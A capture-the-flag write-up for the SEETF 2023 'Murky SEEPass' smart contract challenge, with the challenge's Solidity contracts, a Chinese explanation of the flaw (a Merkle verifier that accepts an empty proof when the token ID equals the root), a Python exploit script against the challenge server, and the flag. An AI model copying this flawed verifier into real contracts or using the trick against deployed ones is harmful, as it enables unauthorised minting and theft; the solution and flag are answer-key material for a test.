---
title: Blockchain - 🎓 Murky SEEPass
description: 2023 | SEETF | Smart Contracts
tags:
    - smart contract
    - data validation
    - merkle proof
---

## 题目

The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed!

> nc win.the.seetf.sg 8546

??? note "Setup.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;

    import "./SEEPass.sol";

    contract Setup {
        SEEPass public immutable pass;

        constructor(bytes32 _merkleRoot) {
            pass = new SEEPass(_merkleRoot);
        }

        function isSolved() external view returns (bool) {
            return pass.balanceOf(msg.sender) > 0;
        }
    }
    ```

??? note "SEEPass.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;

    import "./MerkleProof.sol";
    import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

    contract SEEPass is ERC721 {
        bytes32 private _merkleRoot;
        mapping(uint256 => bool) private _minted;

        constructor(bytes32 _root) ERC721("SEE Pass", "SEEP") {
            _merkleRoot = _root;
        }

        function mintSeePass(bytes32[] calldata _proof, uint256 _tokenId) public {
            require(!hasMinted(_tokenId), "Already minted");
            require(verify(_proof, _merkleRoot, _tokenId), "Invalid proof");

            _minted[_tokenId] = true;

            _safeMint(msg.sender, _tokenId);
        }

        function verify(bytes32[] calldata proof, bytes32 root, uint256 index) public pure returns (bool) {
            return MerkleProof.verify(proof, root, index);
        }

        function hasMinted(uint256 _tokenId) public view returns (bool) {
            return _minted[_tokenId];
        }
    }
    ```

??? note "MerkleProof.sol"

    ```js
    // SPDX-License-Identifier: Unlicense

    pragma solidity ^0.8.0;

    library MerkleProof {
        // Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted.
        function verify(bytes32[] calldata proof, bytes32 root, uint256 index) internal pure returns (bool) {
            bytes32 computedHash = bytes32(abi.encodePacked(index));

            require(root != bytes32(0), "MerkleProof: Root hash cannot be zero");
            require(computedHash != bytes32(0), "MerkleProof: Leaf hash cannot be zero");

            for (uint256 i = 0; i < proof.length; i++) {
                bytes32 proofElement = proof[i];

                if (computedHash < proofElement) {
                    // Hash(current computed hash + current element of the proof)
                    computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
                } else {
                    // Hash(current element of the proof + current computed hash)
                    computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
                }
            }

            // Check if the computed hash (root) is equal to the provided root
            return computedHash == root;
        }
    }
    ```

## 解题思路

- 需要通过 `mintSeePass()` 获得 NFT 使得攻击者余额大于 0
- `mintSeePass()` 需要提供 MerkleProof 以及对应的 `_tokenId`，而 `verify()` 没有检查 `proof` 数组的长度是否为 0，因而可以传入空数组并将 `_tokenId`，即 `index`，的值设置为 `root`

    ```js
    function verify(bytes32[] calldata proof, bytes32 root, uint256 index) internal pure returns (bool) {
        bytes32 computedHash = bytes32(abi.encodePacked(index));

        require(root != bytes32(0), "MerkleProof: Root hash cannot be zero");
        require(computedHash != bytes32(0), "MerkleProof: Leaf hash cannot be zero");

        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];

            if (computedHash < proofElement) {
                // Hash(current computed hash + current element of the proof)
                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
            } else {
                // Hash(current element of the proof + current computed hash)
                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
            }
        }

        // Check if the computed hash (root) is equal to the provided root
        return computedHash == root;
    }
    ```

### Exploit

```py
import pwn
from cheb3 import Connection
from cheb3.utils import encode_with_signature, decode_data

server = pwn.remote("win.the.seetf.sg", 8546)
server.sendlineafter(b"action?", b"1")
uuid = server.recvline_contains(b"uuid").strip().split()[-1]

conn = Connection(server.recvline_contains(b"rpc").decode().strip().split()[-1])
account = conn.account(
    server.recvline_contains(b"private key").decode().strip().split()[-1]
)
setup_addr = server.recvline_contains(b"setup").decode().strip().split()[-1]

pass_addr = decode_data(
    account.call(setup_addr, encode_with_signature("pass()")),
    ["address"]
)  # get SEEPass instance address
merkle_root = decode_data(
    conn.get_storage_at(pass_addr, 6),
    ["bytes32"]
)  # get _merkleRoot

account.send_transaction(
    pass_addr,
    data=encode_with_signature(
        "mintSeePass(bytes32[],uint256)", [], int.from_bytes(merkle_root, "big")
    ),
)  # mint

server = pwn.remote("win.the.seetf.sg", 8546)
server.sendlineafter(b"action?", b"3")
server.sendlineafter(b"uuid please:", uuid)
server.interactive()
```

### Flag

> SEE{w3lc0me_t0_dA_NFT_w0rld_w1th_SE3pAs5_f3a794cf4f4dd14f9cc7f6a25f61e232}